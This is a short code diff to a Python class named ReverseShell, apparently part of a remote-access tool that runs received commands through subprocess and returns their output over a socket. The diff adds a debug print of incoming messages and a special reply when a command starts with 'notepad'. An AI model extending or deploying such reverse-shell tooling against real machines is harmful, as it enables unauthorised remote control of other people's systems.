@@ -272,6 +272,7 @@ class ReverseShell:
                 self.socket_init()
 
     def hq(self, msg):
+        print(msg)
         try:
             if msg[:5] == "data.":
                 data = CommonData()
@@ -301,6 +302,11 @@ class ReverseShell:
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT,
                 )
+
+                if msg.startswith("notepad"):
+                    self.send_msg("[revShell] *opened notpad*")
+                    return
+
                 stdout, stderr = tsk.communicate()
 
                 # Result from subprocess shell decoded in utf-8
